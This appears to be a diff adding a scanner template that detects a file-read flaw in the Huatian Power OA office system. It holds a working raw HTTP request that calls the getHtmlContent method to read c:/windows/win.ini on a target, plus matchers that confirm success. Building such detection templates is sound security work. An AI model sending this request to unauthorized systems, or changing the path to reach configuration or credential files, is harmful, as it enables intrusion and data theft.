@@ -1,0 +1,32 @@
+id: huatian-power-oa-gethtmlcontent-file-read
+info:
+  name: Huatian Power OA getHtmlContent File Reading Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Huatian Power collaborative office system contains a file reading vulnerability in the `getHtmlContent` method, allowing attackers to read important system files such as database or system configuration files, leading to a highly insecure state of the website.
+  reference:
+    - http://www.oa8000.com
+  classification:
+    cvss-score: 7.5
+  tags: file-read
+http:
+  - raw:
+      - |
+        POST /OAapp/bfapp/buffalo/TemplateService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+
+        <buffalo-call>
+        <method>getHtmlContent</method>
+        <string>c:/windows/win.ini</string>
+        </buffalo-call>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "sstateflag"
+        part: body
